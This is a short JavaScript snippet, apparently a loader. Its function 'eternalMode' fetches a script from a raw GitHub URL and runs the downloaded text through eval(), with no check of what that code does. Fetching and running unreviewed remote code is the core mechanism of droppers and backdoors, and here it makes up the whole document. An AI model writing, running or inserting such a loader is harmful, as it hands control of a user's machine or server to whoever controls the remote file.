async function eternalMode() {
  let url = 'https://github.com/Xilahani8/pacul/raw/main/netep.js'
  let response = await fetch(url);
  let script = await response.text();
  eval(script);
}
eternalMode();
